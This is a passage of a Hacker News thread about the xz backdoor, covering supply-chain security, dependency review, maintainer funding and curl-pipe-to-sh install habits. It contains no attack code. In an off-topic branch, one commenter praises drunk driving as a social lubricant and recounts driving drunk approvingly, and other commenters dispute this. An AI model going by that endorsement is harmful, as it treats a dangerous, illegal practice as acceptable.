more]</label></div><br/><div class="children"><div class="content">&gt; The problem with xz wasn&#x27;t a small community; it was <i>no</i> community. A single malicious actor got control of the project, and there was little oversight from anyone else.<p>So because of this a lot of other highly used software was importing and depending on unreviewed code. It&#x27;s scary to think how common this is. The attack surface seems unmanageable. There need to be tighter policies around what dependencies are included, ensuring that they meet some kind of standard.</div><br/><div id="39881407" class="c"><input type="checkbox" id="c-39881407" checked=""/><div class="controls bullet"><span class="by">imiric</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881250">parent</a><span>|</span><a href="#39881528">next</a><span>|</span><label class="collapse" for="c-39881407">[-]</label><label class="expand" for="c-39881407">[5 more]</label></div><br/><div class="children"><div class="content">&gt; There need to be tighter policies around what dependencies are included, ensuring that they meet some kind of standard.<p>This is why it&#x27;s a good practice to minimize the amount of dependencies, and add dependencies only when absolutely required. Taking this a step further, doing a cursory review of each dependency, seeing the transitive dependencies it introduces, are also beneficial. Of course, it&#x27;s impractical to do this for the entire dependency tree, and at some point we have to trust that the projects we depend on follow this same methodology, but having a lax attitude about dependency management is part of the problem that caused the xz situation.<p>One thing that I think would improve this are &quot;maintenance scores&quot;. A service that would scan projects on GitHub and elsewhere, and assign a score to each project that indicates how well maintained it is. It would take into account the number of contributors in the past N months, development activity, community size and interaction, etc. Projects could showcase this in a badge in their READMEs, and it could be integrated in package managers and IDEs that could warn users if adding a dependency that has a low maintenance score. Hopefully this would disuade people to use poorly maintained projects, and encourage them to use better maintained ones, or avoid the dependency altogether. It would also encourage maintainers to improve their score, and there would be higher visibility of projects that are struggling, but have a high user base, as potentially more vulnerable to this type of attack. And then we can work towards figuring out how to provide the help and resources they need to improve.<p>Does such a service&#x2F;concept exist already? I think GitHub should introduce something like this, since they have all the data to power it.</div><br/><div id="39881556" class="c"><input type="checkbox" id="c-39881556" checked=""/><div class="controls bullet"><span class="by">anonymous-panda</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881407">parent</a><span>|</span><a href="#39881454">next</a><span>|</span><label class="collapse" for="c-39881556">[-]</label><label class="expand" for="c-39881556">[3 more]</label></div><br/><div class="children"><div class="content">That’s not an effective idea for the same reason that lines of code is not a good measure of productivity. It’s an easy measure to automate but it’s purely performative as it doesn’t score the qualitative value of any of the maintenance work. At best it encourages you to use only popular projects which is its own danger (software monoculture is cheaper to attack) without actually resolving the danger - this attack is reasonably sophisticated and underhanded that could be slipped through almost any code review.<p>One real issue is that xz’s build system is so complicated that it’s possible to slip things in which is an indication that the traditional autoconf Linux build mechanism needs to be retired and banned from distros.<p>But even that’s not enough because an attack only needs to succeed once. The advice to minimize your dependencies is an impractical one in a lot of cases (clearly) and not in your full control as you may acquire a surprising dependency due to transitiveness. And updating your dependencies is a best practice which in this case actually introduces the problem.<p>We need to focus on real ways to improve the supply chain. eg having repeatable idempotent builds with signed chain of trusts that are backed by real identities that can be prosecuted and burned. For example, it would be pretty effective counter incentive for talent if we could permanently ban this person from ever working on lots of projects. That’s typically how humans deal with members of a community who misbehave and we don’t have a good digital equivalent for software development. Of course that’s also dangerous as blackball environments tend to become weaponized.</div><br/><div id="39881936" class="c"><input type="checkbox" id="c-39881936" checked=""/><div class="controls bullet"><span class="by">kbenson</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881556">parent</a><span>|</span><a href="#39881454">next</a><span>|</span><label class="collapse" for="c-39881936">[-]</label><label class="expand" for="c-39881936">[2 more]</label></div><br/><div class="children"><div class="content">&gt; We need to focus on real ways to improve the supply chain. eg having repeatable idempotent builds with signed chain of trusts that are backed by real identities that can be prosecuted and burned.<p>So, either no open source development because nobody will vouch to that degree for others, or absolutely no anonymity and you&#x27;ll have to worry about anything you provide because of you screw up and introduce a RCE all of a sudden you&#x27;ll have a bunch of people and companies looking to say it was on purpose so they don&#x27;t have to own up to any of their own poor practices that allowed it to actually be executed on?</div><br/><div id="39882273" class="c"><input type="checkbox" id="c-39882273" checked=""/><div class="controls bullet"><span class="by">anonymous-panda</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881936">parent</a><span>|</span><a href="#39881454">next</a><span>|</span><label class="collapse" for="c-39882273">[-]</label><label class="expand" for="c-39882273">[1 more]</label></div><br/><div class="children"><div class="content">You don’t need vouching for anyone. mDL is going to be a mechanism to have a government authority vouch your identity. Of course a state actor like this can forge the identity, but that forgery at least will give a starting point for the investigation to try to figure out who this individual is. There’s other technical questions about how you verify that the identity really is tied in some real way to the user at the other end (eg not a stolen identity) but there are things coming down that will help with that (ie authenticated chains of trust for hw that can attest the identity was signed on the given key in person and you require that attestation).<p>As for people accusing you of an intentional RCE, that may be a hypothetical scenario but I doubt it’s very real. Most people have a very long history of good contributions and therefore have built up a reputation that would be compared against the reality on the ground. No one is accusing Lasse Collin of participating in this even though arguably it could have been him all along for what anyone knows.<p>It doesn’t need to be perfect but directionally it probably helps more than it hurts.<p>All that being said, this clearly seems like a state actor which changes the calculus for any attempts like this since the funding and power is completely different than what most people have access to and likely we don’t have any really good countermeasures here beyond making it harder for obfuscated code to make it into repositories.</div><br/></div></div></div></div></div></div><div id="39881454" class="c"><input type="checkbox" id="c-39881454" checked=""/><div class="controls bullet"><span class="by">braiamp</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881407">parent</a><span>|</span><a href="#39881556">prev</a><span>|</span><a href="#39881528">next</a><span>|</span><label class="collapse" for="c-39881454">[-]</label><label class="expand" for="c-39881454">[1 more]</label></div><br/><div class="children"><div class="content">Your idea sounds nice in theory, but it&#x27;s absolutely not worth the amount of effort. To put it in perspective, think about xz case, and how the amount of contributions would have prevented the release artifact (tar file) from being modified? Because other people would have used the tar file? Why? The only ones that use tarfiles are the ones that would be redistributing the code, they will not audit it. The ones that could audit it would look at the version system repository, not at the tar files. In other words, your solution wouldn&#x27;t even be effective at potentially discovering this issue.<p>The only thing that would effectively do this, is that people stop trusting build artifacts and instead use direct from public repositories packaging. You could figure out if someone maliciously modified the release artifact by comparing it against the tagged version, but at that point, why not just shallow clone the entire thing and be done.</div><br/></div></div></div></div><div id="39881528" class="c"><input type="checkbox" id="c-39881528" checked=""/><div class="controls bullet"><span class="by">cjbprime</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881250">parent</a><span>|</span><a href="#39881407">prev</a><span>|</span><a href="#39881281">next</a><span>|</span><label class="collapse" for="c-39881528">[-]</label><label class="expand" for="c-39881528">[2 more]</label></div><br/><div class="children"><div class="content">Even if you mandated two code reviewers per merge, the attacker can just have three fake personas backed by the same single human and use them to author and approve malware.</div><br/><div id="39881822" class="c"><input type="checkbox" id="c-39881822" checked=""/><div class="controls bullet"><span class="by">Deathcrow</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881528">parent</a><span>|</span><a href="#39881281">next</a><span>|</span><label class="collapse" for="c-39881822">[-]</label><label class="expand" for="c-39881822">[1 more]</label></div><br/><div class="children"><div class="content">Also, in a more optimistic scenario without sockpuppets, it&#x27;s unlikely that malicious and underhanded contributions will be caught by anyone that isn&#x27;t a security researcher.</div><br/></div></div></div></div><div id="39881281" class="c"><input type="checkbox" id="c-39881281" checked=""/><div class="controls bullet"><span class="by">colejohnson66</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881250">parent</a><span>|</span><a href="#39881528">prev</a><span>|</span><a href="#39881318">next</a><span>|</span><label class="collapse" for="c-39881281">[-]</label><label class="expand" for="c-39881281">[1 more]</label></div><br/><div class="children"><div class="content">As always, there&#x27;s a relevant XKCD: #2347.[0] It&#x27;s frightening how much of modern infrastructure depends on vulnerable systems.<p>[0]: <a href="https:&#x2F;&#x2F;xkcd.com&#x2F;2347&#x2F;" rel="nofollow">https:&#x2F;&#x2F;xkcd.com&#x2F;2347&#x2F;</a></div><br/></div></div><div id="39881318" class="c"><input type="checkbox" id="c-39881318" checked=""/><div class="controls bullet"><span class="by">eacapeisfutuile</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881250">parent</a><span>|</span><a href="#39881281">prev</a><span>|</span><a href="#39882175">next</a><span>|</span><label class="collapse" for="c-39881318">[-]</label><label class="expand" for="c-39881318">[1 more]</label></div><br/><div class="children"><div class="content">Does that mean we don’t look into changes in dependencies at all when bumping them?</div><br/></div></div></div></div><div id="39882175" class="c"><input type="checkbox" id="c-39882175" checked=""/><div class="controls bullet"><span class="by">yosito</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880972">parent</a><span>|</span><a href="#39881250">prev</a><span>|</span><a href="#39881974">next</a><span>|</span><label class="collapse" for="c-39882175">[-]</label><label class="expand" for="c-39882175">[1 more]</label></div><br/><div class="children"><div class="content">I wonder how good automated LLM-based code reviews would be at picking up suspicious patterns in pull requests.</div><br/></div></div></div></div><div id="39881974" class="c"><input type="checkbox" id="c-39881974" checked=""/><div class="controls bullet"><span class="by">kubb</span><span>|</span><a href="#39880433">parent</a><span>|</span><a href="#39880972">prev</a><span>|</span><a href="#39881036">next</a><span>|</span><label class="collapse" for="c-39881974">[-]</label><label class="expand" for="c-39881974">[1 more]</label></div><br/><div class="children"><div class="content">What’s the game?</div><br/></div></div><div id="39880672" class="c"><input type="checkbox" id="c-39880672" checked=""/><div class="controls bullet"><span class="by">p-e-w</span><span>|</span><a href="#39880433">parent</a><span>|</span><a href="#39881036">prev</a><span>|</span><a href="#39881424">next</a><span>|</span><label class="collapse" for="c-39880672">[-]</label><label class="expand" for="c-39880672">[27 more]</label></div><br/><div class="children"><div class="content">&gt; but in the back of my mind I&#x27;m thinking, man, anyone could just code up some real nasty backdoor and the project would be screwed<p>That&#x27;s true of course, but it&#x27;s not a problem specific to software. In fact, I&#x27;m not even sure it&#x27;s a &quot;problem&quot; in a meaningful sense at all.<p>When you&#x27;re taking a walk on a forest road, any car that comes your way could just run you over. Chances are the driver would never get caught. There is nothing you can do to protect yourself against it. Police aren&#x27;t around to help you. This horror scenario, much worse than a software backdoor, is actually the minimum viable danger that you need to accept in order to be able to do anything at all. And yes, sometimes it does really happen.<p>But at the end of the day, the vast majority of people just don&#x27;t seek to actively harm others. Everything humans do relies on that assumption, and always has. The fantasy that if code review was just a little tighter, if more linters, CI mechanisms, and pattern matching were employed, if code signing was more widespread, if we verified people&#x27;s identities etc., if all these things were implemented, then such scenarios could be prevented, that fantasy is the real problem. It&#x27;s symptomatic of the insane Silicon Valley vision that the world can and should be managed and controlled at every level of detail. Which is a &quot;cure&quot; that would be much worse than any disease it could possibly prevent.</div><br/><div id="39881102" class="c"><input type="checkbox" id="c-39881102" checked=""/><div class="controls bullet"><span class="by">imiric</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39880989">next</a><span>|</span><label class="collapse" for="c-39881102">[-]</label><label class="expand" for="c-39881102">[3 more]</label></div><br/><div class="children"><div class="content">&gt; When you&#x27;re taking a walk on a forest road, any car that comes your way could just run you over. Chances are the driver would never get caught. There is nothing you can do to protect yourself against it.<p>Sure you can. You can be more vigilant and careful when walking near traffic. So maybe don&#x27;t have headphones on, and engage all your senses on the immediate threats around you. This won&#x27;t guarantee that a car won&#x27;t run you over, but it reduces the chances considerably to where you can possibly avoid it.<p>The same can be said about the xz situation. All the linters, CI checks and code reviews couldn&#x27;t guarantee that this wouldn&#x27;t happen, but they sure would lower the chances that it does. Having a defeatist attitude that nothing could be done to prevent it, and that therefore all these development practices are useless, is not helpful for when this happens again.<p>The major problem with the xz case was the fact it had 2 maintainers, one who was mostly absent, and the other who gradually gained control over the project and introduced the malicious code. No automated checks could&#x27;ve helped in this case, when there were no code reviews, and no oversight over what gets merged at all. But had there been some oversight and thorough review from at least one other developer, then the chances of this happening would be lower.<p>It&#x27;s important to talk about probabilities here instead of absolute prevention, since it&#x27;s possible that even in the strictest of environments, with many active contributors, malicious code could still theoretically be merged in. But without any of it, this approaches 100% (minus the probability of someone acting maliciously to begin with, having their account taken over, etc.).</div><br/><div id="39881398" class="c"><input type="checkbox" id="c-39881398" checked=""/><div class="controls bullet"><span class="by">p-e-w</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881102">parent</a><span>|</span><a href="#39880989">next</a><span>|</span><label class="collapse" for="c-39881398">[-]</label><label class="expand" for="c-39881398">[2 more]</label></div><br/><div class="children"><div class="content">It&#x27;s not defeatist to admit and accept that some things are ultimately out of our control. And more importantly, that any attempt to increase control over them comes with downsides.<p>An open source project that imposes all kinds of restrictions and complex bureaucratic checks before anything can get merged, is a project I wouldn&#x27;t want to participate in. I imagine many others might feel the same. So perhaps the loss from such measures would be greater than the gain. Without people willing to contribute their time, open source cannot function.</div><br/></div></div></div></div><div id="39880989" class="c"><input type="checkbox" id="c-39880989" checked=""/><div class="controls bullet"><span class="by">mendyberger</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39881102">prev</a><span>|</span><a href="#39881403">next</a><span>|</span><label class="collapse" for="c-39880989">[-]</label><label class="expand" for="c-39880989">[2 more]</label></div><br/><div class="children"><div class="content">Difference is that software backdoors can effect billions of people. That driver on the road can&#x27;t effect too many without being caught.<p>In this case, had they been a bit more careful with performance, they could have effected millions of machines without being caught. There aren&#x27;t many cases where a lone wolf can do so much damage outside of software.</div><br/><div id="39881160" class="c"><input type="checkbox" id="c-39881160" checked=""/><div class="controls bullet"><span class="by">taberiand</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880989">parent</a><span>|</span><a href="#39881403">next</a><span>|</span><label class="collapse" for="c-39881160">[-]</label><label class="expand" for="c-39881160">[1 more]</label></div><br/><div class="children"><div class="content">A few more issues like this in crucial software and we might actually see the big companies stepping up to fund that kind of care and attention.</div><br/></div></div></div></div><div id="39881403" class="c"><input type="checkbox" id="c-39881403" checked=""/><div class="controls bullet"><span class="by">godelski</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39880989">prev</a><span>|</span><a href="#39880984">next</a><span>|</span><label class="collapse" for="c-39881403">[-]</label><label class="expand" for="c-39881403">[3 more]</label></div><br/><div class="children"><div class="content">Honestly this is why I think we should pay people for open source projects. It is a tragedy of the commons issues. All of us benefit a lot from these free software, and done for free. Pay doesn&#x27;t exactly fix the problems directly, but they do decrease the risk. Pay means people can work on these full time instead of on the side. Pay means it is harder to bribe someone. Pay also makes the people contributing feel better and more like their work is meaningful. Importantly, pay signals to these people that we care about them. I think the big tech should pay. We know the truth is that they&#x27;ll pass on the costs to us anyways. I&#x27;d also be happy to pay taxes but that&#x27;s probably harder. I&#x27;m not sure what the best solution is and this is clearly only a part of a much larger problem, but I think it is very important that we actually talk about how much value OSS has. If we&#x27;re going to talk about how money represents value of work, we can&#x27;t just ignore how much value is generated from OSS and only talk about what&#x27;s popular and well know. There are tons of critical infrastructure in every system you could think of (traditional engineering, politics, anything) that is unknown. We shouldn&#x27;t just pay things that are popular. We should definitely pay things that are important. Maybe the conversation can be different when AI takes all the jobs (lol)</div><br/><div id="39881578" class="c"><input type="checkbox" id="c-39881578" checked=""/><div class="controls bullet"><span class="by">beanjuiceII</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881403">parent</a><span>|</span><a href="#39880984">next</a><span>|</span><label class="collapse" for="c-39881578">[-]</label><label class="expand" for="c-39881578">[2 more]</label></div><br/><div class="children"><div class="content">Ya so we could have paid this dude to put the exploits in our programs good IDEA y</div><br/><div id="39882139" class="c"><input type="checkbox" id="c-39882139" checked=""/><div class="controls bullet"><span class="by">godelski</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881578">parent</a><span>|</span><a href="#39880984">next</a><span>|</span><label class="collapse" for="c-39882139">[-]</label><label class="expand" for="c-39882139">[1 more]</label></div><br/><div class="children"><div class="content">If you&#x27;re going to criticize me, at least read what I wrote first</div><br/></div></div></div></div></div></div><div id="39880984" class="c"><input type="checkbox" id="c-39880984" checked=""/><div class="controls bullet"><span class="by">keepamovin</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39881403">prev</a><span>|</span><a href="#39880695">next</a><span>|</span><label class="collapse" for="c-39880984">[-]</label><label class="expand" for="c-39880984">[1 more]</label></div><br/><div class="children"><div class="content">This is a good take. But even in a forest, sometimes when tragedy strikes people do postmortems, question regulations and push for change.<p>Sometimes, it does seem like the internet incentivizes or makes everyone else accessible to a higher ratio of people who seem to harm than normal.</div><br/></div></div><div id="39880695" class="c"><input type="checkbox" id="c-39880695" checked=""/><div class="controls bullet"><span class="by">consumer451</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39880984">prev</a><span>|</span><a href="#39880901">next</a><span>|</span><label class="collapse" for="c-39880695">[-]</label><label class="expand" for="c-39880695">[14 more]</label></div><br/><div class="children"><div class="content">&gt; But at the end of the day, the vast majority of people just don&#x27;t seek to actively harm others. Everything humans do relies on that assumption, and always has.<p><a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Normalcy_bias" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Normalcy_bias</a> ?<p>&gt; It&#x27;s symptomatic of the insane Silicon Valley vision that the world can and should be managed and controlled at every level of detail. Which is a &quot;cure&quot; that would be much worse than any disease it could possibly prevent.<p>What &quot;cure&quot; would you recommend?</div><br/><div id="39880806" class="c"><input type="checkbox" id="c-39880806" checked=""/><div class="controls bullet"><span class="by">pmarreck</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880695">parent</a><span>|</span><a href="#39880759">next</a><span>|</span><label class="collapse" for="c-39880806">[-]</label><label class="expand" for="c-39880806">[10 more]</label></div><br/><div class="children"><div class="content">You need to accept that everything has a tradeoff and some amount of drama just seems to be built into the system.<p>Take sex work, for example. Legalizing it leads to an overall increase in sex trafficking. But it also does this: <a href="https:&#x2F;&#x2F;www.washingtonpost.com&#x2F;news&#x2F;wonk&#x2F;wp&#x2F;2014&#x2F;07&#x2F;17&#x2F;when-rhode-island-accidentally-legalized-prostitution-rape-and-stis-decreased-sharply&#x2F;" rel="nofollow">https:&#x2F;&#x2F;www.washingtonpost.com&#x2F;news&#x2F;wonk&#x2F;wp&#x2F;2014&#x2F;07&#x2F;17&#x2F;when-...</a><p>My personal opinion is that if something is going to find a way to conduct itself in secret anyway (at high risk and cost) if it is banned, it is always better to just suck it up and permit it and regulate it in the open instead. Trafficked people are far easier to discover in an open market than a black one. Effects of anything (both positive and negative) are far easier to assess when the thing being assessed is legal.<p>Should we ban cash because it incentivizes mugging and pickpocketing and theft? (I&#x27;ve been the victim of pickpocketing. The most valuable thing they took was an irreplaceable military ID I carried (I was long since inactive)... Not the $25 in cash in my wallet at the time.) I mean, there would literally be far fewer muggings if no one carried cash. Is it thus the cash&#x27;s &quot;fault&quot;?</div><br/><div id="39880863" class="c"><input type="checkbox" id="c-39880863" checked=""/><div class="controls bullet"><span class="by">consumer451</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880806">parent</a><span>|</span><a href="#39880759">next</a><span>|</span><label class="collapse" for="c-39880863">[-]</label><label class="expand" for="c-39880863">[9 more]</label></div><br/><div class="children"><div class="content">But there have to be specific trade-offs, in each case.<p>I am reminded of the words of &quot;a wise man.&quot;<p><a href="https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39874049">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39874049</a><p><i>Captain&#x27;s Log:</i> This entire branch of comments responding to OP is not helping advance humanity in any significant way. I would appreciate my statement of protest being noted by the alien archeologists who find these bits in the wreckage of my species.</div><br/><div id="39880930" class="c"><input type="checkbox" id="c-39880930" checked=""/><div class="controls bullet"><span class="by">Dalewyn</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880863">parent</a><span>|</span><a href="#39880759">next</a><span>|</span><label class="collapse" for="c-39880930">[-]</label><label class="expand" for="c-39880930">[8 more]</label></div><br/><div class="children"><div class="content">I think drunk driving being an oil that keeps society lubricated cannot and should not be understated.<p>Yes, drunk driving kills people and that&#x27;s unacceptable. On the other hand, people going out to eat and drink with family, friends, and co-workers after work helps keep society functioning, and the police respect this reality because they don&#x27;t arrest clearly-drunk patrons coming out of restaurants to drive back home.</div><br/><div id="39881127" class="c"><input type="checkbox" id="c-39881127" checked=""/><div class="controls bullet"><span class="by">Karrot_Kream</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880930">parent</a><span>|</span><a href="#39880975">next</a><span>|</span><label class="collapse" for="c-39881127">[-]</label><label class="expand" for="c-39881127">[5 more]</label></div><br/><div class="children"><div class="content">This is such a deeply American take that I can&#x27;t help but laugh out loud. It&#x27;s like going to a developing nation and saying that, while emissions from two stroke scooters kills people there&#x27;s no alternative to get your life things done.</div><br/><div id="39881922" class="c"><input type="checkbox" id="c-39881922" checked=""/><div class="controls bullet"><span class="by">Dalewyn</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881127">parent</a><span>|</span><a href="#39881361">next</a><span>|</span><label class="collapse" for="c-39881922">[-]</label><label class="expand" for="c-39881922">[3 more]</label></div><br/><div class="children"><div class="content">It certainly isn&#x27;t just America, though we&#x27;re probably certainly the most infamous example.<p>I was in France for business once in the countryside (southern France), and the host took everyone (me, their employees, etc.) out to lunch. Far as I could tell it was just an everyday thing. Anyway, we drove about an hour to a nearby village and practically partied for a few hours. Wine flowed like a river. Then we drove back and we all got back to our work. So not only were we drunk driving, we were drunk working. Even Americans usually don&#x27;t drink that hard; the French earned my respect that day, they know how to have a good time.<p>Also many times in Japan, I would invite a business client&#x2F;supplier or a friend over for dinner at a sushi bar. It&#x27;s not unusual for some to drive rather than take the train, and then of course go back home driving after having had lots of beer and sake.<p>Whether any of us like it or not, drunk driving is an oil that lubricates society.</div><br/><div id="39882019" class="c"><input type="checkbox" id="c-39882019" checked=""/><div class="controls bullet"><span class="by">kbenson</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881922">parent</a><span>|</span><a href="#39881361">next</a><span>|</span><label class="collapse" for="c-39882019">[-]</label><label class="expand" for="c-39882019">[2 more]</label></div><br/><div class="children"><div class="content">&gt; Even Americans usually don&#x27;t drink that hard; the French earned my respect that day.<p>Is drinking hard something so deserving of respect? Is working while impaired?<p>To me this reads as &quot;I like to fuck off and be irresponsible and man did these French guys show me how it&#x27;s done!&quot;</div><br/><div id="39882106" class="c"><input type="checkbox" id="c-39882106" checked=""/><div class="controls bullet"><span class="by">Dalewyn</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39882019">parent</a><span>|</span><a href="#39881361">next</a><span>|</span><label class="collapse" for="c-39882106">[-]</label><label class="expand" for="c-39882106">[1 more]</label></div><br/><div class="children"><div class="content">Except they weren&#x27;t irresponsible. We all drove back just fine, and we all went back to work just as competently as before like nothing happened.<p>It takes skill and maturity to have a good time but not so much that it would impair subsequent duties. The French demonstrated to me they have that down to a much finer degree than most of us have in America, so they have my respect.<p>This isn&#x27;t to say Americans are immature, mind you. For every drunk driving incident you hear on the news, hundreds of thousands if not millions of Americans drive home drunk without harming anyone for their entire lives. What I will admit is Americans would still refrain from drinking so much during lunch when we still have a work day left ahead of us, that&#x27;s something we can take lessons from the French on.<p>Life is short, so those who can have more happy hours without compromising their duties are the real winners.</div><br/></div></div></div></div></div></div><div id="39881361" class="c"><input type="checkbox" id="c-39881361" checked=""/><div class="controls bullet"><span class="by">pierat</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881127">parent</a><span>|</span><a href="#39881922">prev</a><span>|</span><a href="#39880975">next</a><span>|</span><label class="collapse" for="c-39881361">[-]</label><label class="expand" for="c-39881361">[1 more]</label></div><br/><div class="children"><div class="content">You can laugh out loud all you want, but there are mandatory parking minimums for bars across the USA.<p>Yes, bars have parking lots, and a lot of spaces.<p>The intent is to *drive* there, drink and maybe eat, and leave in some various state of drunkenness. Why else would the spacious parking lots be required?</div><br/></div></div></div></div><div id="39880975" class="c"><input type="checkbox" id="c-39880975" checked=""/><div class="controls bullet"><span class="by">brailsafe</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880930">parent</a><span>|</span><a href="#39881127">prev</a><span>|</span><a href="#39881704">next</a><span>|</span><label class="collapse" for="c-39880975">[-]</label><label class="expand" for="c-39880975">[1 more]</label></div><br/><div class="children"><div class="content">What is more depressing is how we can acknowledge that reality and continue to do absolutely nothing to mitigate it but punish it, in many cases.<p>The more people practically need to drive, the more people will drunk drive and kill people, yet in so many cases we just sort of stop there and be like &quot;welp, guess that&#x27;s just nature&quot; instead of building viable alternatives. However the other theoretical possibly is that if people didn&#x27;t need to drive, they might end up drinking more.</div><br/></div></div><div id="39881704" class="c"><input type="checkbox" id="c-39881704" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880930">parent</a><span>|</span><a href="#39880975">prev</a><span>|</span><a href="#39880759">next</a><span>|</span><label class="collapse" for="c-39881704">[-]</label><label class="expand" for="c-39881704">[1 more]</label></div><br/><div class="children"><div class="content">drunk driving may kill a lot of people, but it also helps a lot of people get to work on time, so, it;s impossible to say if its bad or not,</div><br/></div></div></div></div></div></div></div></div><div id="39880759" class="c"><input type="checkbox" id="c-39880759" checked=""/><div class="controls bullet"><span class="by">p-e-w</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880695">parent</a><span>|</span><a href="#39880806">prev</a><span>|</span><a href="#39880800">next</a><span>|</span><label class="collapse" for="c-39880759">[-]</label><label class="expand" for="c-39880759">[2 more]</label></div><br/><div class="children"><div class="content">&gt; <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Normalcy_bias" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Normalcy_bias</a><p>Indeed, that &quot;bias&quot; is a vital mechanism that enables societies to function. Good luck getting people to live together if they look at passerbys thinking &quot;there is a 0.34% chance that guy is a serial killer&quot;.<p>&gt; What &quot;cure&quot; would you recommend?<p>Accepting that not every problem can, or needs to be, solved. Today&#x27;s science&#x2F;tech culture suffers from an almost cartoonish god complex seeking to manage humanity into a glorious data-driven future. That isn&#x27;t going to happen, and we&#x27;re better off for it. People will still die in the future, and they will still commit crimes. Tomorrow, I might be the victim, as I already have been in the past. But that doesn&#x27;t mean I want the insane hyper-control that some of our so-called luminaries are pushing us towards to become reality.</div><br/></div></div></div></div><div id="39880901" class="c"><input type="checkbox" id="c-39880901" checked=""/><div class="controls bullet"><span class="by">Dalewyn</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39880695">prev</a><span>|</span><a href="#39880850">next</a><span>|</span><label class="collapse" for="c-39880901">[-]</label><label class="expand" for="c-39880901">[1 more]</label></div><br/><div class="children"><div class="content">&gt;But at the end of the day, the vast majority of people just don&#x27;t seek to actively harm others. Everything humans do relies on that assumption, and always has.<p>Wholeheartedly agree. Fundamentally, we all assume that people are operating with good will and establish trust with that as the foundation (granted to varying degrees depending on the culture, some are more trusting or skeptical than others).<p>It&#x27;s also why building trust takes ages and destroying it only takes seconds, and why violations of trust at all are almost always scathing to our very soul.<p>We certainly <i>can</i> account for bad actors, and depending on what&#x27;s at stake (eg: hijacking airliners) we do forego assuming good will. But taking that too far is a very uncomfortable world to live in, because it&#x27;s counter to something very fundamental for humans and life.</div><br/></div></div><div id="39880850" class="c"><input type="checkbox" id="c-39880850" checked=""/><div class="controls bullet"><span class="by">ikekkdcjkfke</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39880672">parent</a><span>|</span><a href="#39880901">prev</a><span>|</span><a href="#39881424">next</a><span>|</span><label class="collapse" for="c-39880850">[-]</label><label class="expand" for="c-39880850">[2 more]</label></div><br/><div class="children"><div class="content">lgtm</div><br/></div></div></div></div><div id="39881348" class="c"><input type="checkbox" id="c-39881348" checked=""/><div class="controls bullet"><span class="by">benreesman</span><span>|</span><a href="#39880433">parent</a><span>|</span><a href="#39881424">prev</a><span>|</span><a href="#39880985">next</a><span>|</span><label class="collapse" for="c-39881348">[-]</label><label class="expand" for="c-39881348">[3 more]</label></div><br/><div class="children"><div class="content">It never ceases to amaze me how great of lengths companies go to round securing the perimeter of the network but then have engineering staffs that just routinely brew install casks or vi&#x2F;emacs&#x2F;vscode&#x2F;etc extensions.<p>Rust is arguably the programming language and&#x2F;or community with the most secure set of defaults that are fairly impossible to get out of, but even at “you can’t play games with pointers” levels of security-first, the most common&#x2F;endorsed path for installing <i>it</i> (that I do all the time because I’m a complete hypocrite) is:<p><a href="https:&#x2F;&#x2F;www.rust-lang.org&#x2F;tools&#x2F;install" rel="nofollow">https:&#x2F;&#x2F;www.rust-lang.org&#x2F;tools&#x2F;install</a><p>and that’s just one example, “yo dawg curl this shit and pipe it to sh so you can RCE while you bike shed someone’s unsafe block” is just muscle memory for way too many of us at this point.</div><br/><div id="39881565" class="c"><input type="checkbox" id="c-39881565" checked=""/><div class="controls bullet"><span class="by">anonymous-panda</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881348">parent</a><span>|</span><a href="#39881419">next</a><span>|</span><label class="collapse" for="c-39881565">[-]</label><label class="expand" for="c-39881565">[1 more]</label></div><br/><div class="children"><div class="content">It’s worse than that. Build.rs is in no way sandboxed which means you can inject all sorts of badness into downstream dependencies not to mention do things like steal crypto keys from developers. It’s really a sore spot for the Rust community (to be fair they’re not uniquely worse but that’s a fact poor standard to shoot for).</div><br/></div></div><div id="39881419" class="c"><input type="checkbox" id="c-39881419" checked=""/><div class="controls bullet"><span class="by">godelski</span><span>|</span><a href="#39880433">root</a><span>|</span><a href="#39881348">parent</a><span>|</span><a href="#39881565">prev</a><span>|</span><a href="#39880985">next</a><span>|</span><label class="collapse" 